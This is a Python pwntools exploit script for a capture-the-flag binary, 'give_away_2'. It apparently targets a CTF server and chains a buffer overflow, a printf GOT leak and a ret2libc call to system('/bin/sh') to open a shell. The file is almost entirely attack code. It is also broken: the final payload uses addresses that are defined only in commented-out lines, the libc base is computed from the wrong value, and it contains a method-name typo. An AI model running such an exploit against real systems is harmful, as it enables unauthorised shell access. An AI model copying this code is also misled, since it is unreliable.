#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#from LibcSearcher import LibcSearcher

context(os="linux", arch="amd64",log_level = "debug")
p = process('./give_away_2')
p = remote('sharkyctf.xyz', 20335)
#p = process(['./give_away_2'],env={"LD_PRELOAD":"./libc-2.27.so"})
#p = process(["/lib32/ld-2.23.so", "./give_away_2"], env={"LD_PRELOAD":"/lib32/libc.so.6"})

elf = ELF('./give_away_2')
libc=ELF('./libc-2.27.so')

#gdb.attach(p, 'b main')
p.recvuntil('Give away: ')

main_addr=int(p.recvuntil('\n'), 16)
#main_addr=int(p.recvline_startswith(b'Give')[-12:], 0x10)

system_offset = 0x4f440
main_offset = 0x21ab0

#system_addr=0x55733aa7d864
system_libc=libc.symbols['system']
#libc_start_main=0x201060
#libcbase =main_addr - libc.dump('__libc_start_main')
#libcbase =main_addr - libc_start_main
libcbase =main_addr - libc.symbols['__libc_start_main']
print "printf_libcbase : " + hex(libcbase)
#puts_got=elf.got['puts']
#puts_plt=elf.plt['puts']
#puts_libc=libc.symbols['puts']

printf_got=elf.got['printf']
printf_plt=elf.plt["printf"]
printf_libc = libc.symbols['printf']
#system_got=elf.got['system']
pop_rdi=0x0000000000000903

#libcbase=main_addr - elf.sym['main'] + 0x880
#system_addr= libcbase + system_libc
#binsh_addr = libcbase + binsh_libc
print "printf_got : " + hex(printf_got)
print "printf_plt : " + hex(printf_plt)
print "printf_libc : " + hex(printf_libc)
#print "system_got : " + hex(system_got)
print "system_libc : " + hex(system_libc)
#print "system_addr : " + hex(system_addr)

#offset = system_addr - system_libc
#binsh_addr= binsh_libc + offset
#print "binsh_addr : " + hex(binsh_addr)

printf_giveaway=main_addr - elf.symbols['main'] + 0x880

payload = 'A'*40
payload += p64(pop_rdi)
payload += p64(printf_got)
payload += p64(printf_giveaway)

p.sendline(payload)
printflibc = unpack(p.recv(), 'all', sign=False)
libc.address = printf_libc - libc.symbol['printf']
system_libc = libc.symbols['system']
binsh_libc=libc.search("/bin/sh").next()

payload2 = 'A'*40
payload2 += p64(pop_rdi) 
payload2 += p64(binsh_addr)
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)
#pause()

p.sendline(payload2)
p.interactive()

